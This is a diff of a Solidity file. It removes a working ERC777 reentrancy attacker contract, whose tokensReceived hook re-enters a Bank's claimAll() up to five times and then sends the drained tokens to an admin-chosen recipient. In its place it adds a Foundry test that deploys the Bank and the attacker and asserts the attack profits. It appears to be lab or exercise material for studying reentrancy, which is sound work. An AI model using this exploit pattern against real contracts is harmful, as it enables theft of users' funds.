@@ -1,89 +1,53 @@
-// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
 
-import "@openzeppelin/contracts/access/AccessControl.sol";
-import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
-import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
-import "./Bank.sol";
+import "forge-std/Test.sol";
+import "../src/Attacker.sol";
+import "../src/Bank.sol";
+import "@openzeppelin/contracts/utils/introspection/ERC1820Registry.sol";
 
-contract Attacker is AccessControl, IERC777Recipient {
-    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
-    IERC1820Registry private _erc1820;
-    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
-    uint8 private depth = 0;
-    uint8 private constant MAX_DEPTH = 5;
+contract AttackerTest is Test {
+    Attacker attacker;
+    Bank bank;
+    ERC1820Registry erc1820;
 
-    Bank public bank;
+    address attackerAdmin = address(1);
 
-    event Recurse(uint8 depth);
-    event TokensReceivedCalled(uint8 depth);
+    function setUp() public {
+        // Deploy the ERC1820 registry
+        erc1820 = new ERC1820Registry();
 
-    constructor(address admin, address erc1820RegistryAddress) {
-        _grantRole(DEFAULT_ADMIN_ROLE, admin);
-        _grantRole(ATTACKER_ROLE, admin);
-
-        _erc1820 = IERC1820Registry(erc1820RegistryAddress);
-
-        // Register this contract as an ERC777TokensRecipient
-        _erc1820.setInterfaceImplementer(
-            address(this),
-            TOKENS_RECIPIENT_INTERFACE_HASH,
-            address(this)
+        // Set the ERC1820 registry code at the expected address
+        vm.etch(
+            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),
+            address(erc1820).code
         );
+
+        // Deploy the Bank contract
+        bank = new Bank(address(this));
+
+        // Deploy the Attacker contract with the correct arguments
+        attacker = new Attacker(attackerAdmin, address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24));
+
+        // Set the target bank in the attacker contract
+        vm.prank(attackerAdmin);
+        attacker.setTarget(address(bank));
     }
 
-    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
-        bank = Bank(bank_address);
-    }
+    function testAttack() public {
+        vm.deal(attackerAdmin, 1 ether);
 
-    function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
-        require(address(bank) != address(0), "Target bank not set");
-        require(msg.value == amt, "Incorrect ETH amount sent");
+        vm.startPrank(attackerAdmin);
 
-        // Deposit ETH to have a positive balance in the Bank
-        bank.deposit{value: amt}();
+        // Execute the attack
+        attacker.attack{value: 1 ether}(1 ether);
 
-        // Start the reentrancy attack by calling claimAll()
-        bank.claimAll();
-    }
+        vm.stopPrank();
 
-    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
-        require(recipient != address(0), "Invalid recipient");
-
-        // Get the token contract from the bank
+        // Assert the attacker's token balance has increased
         ERC777 token = bank.token();
-        uint256 tokenBalance = token.balanceOf(address(this));
+        uint256 attackerTokenBalance = token.balanceOf(address(attacker));
 
-        require(tokenBalance > 0, "No tokens to withdraw");
-
-        // Send the stolen tokens to the recipient
-        token.send(recipient, tokenBalance, "");
+        // The balance should be greater than the initial deposit amount due to the reentrancy attack
+        assert(attackerTokenBalance > 1 ether);
     }
-
-    function tokensReceived(
-        address,
-        address,
-        address,
-        uint256,
-        bytes calldata,
-        bytes calldata
-    ) external override {
-        // Ensure the function is called by the Bank's token contract
-        require(msg.sender == address(bank.token()), "Invalid token sender");
-
-        emit TokensReceivedCalled(depth);
-
-        if (depth < MAX_DEPTH) {
-            depth++;
-
-            // Reentrantly call claimAll() to exploit the vulnerability
-            bank.claimAll();
-
-            emit Recurse(depth);
-        }
-
-        depth--;
-    }
-
-    receive() external payable {}
 }
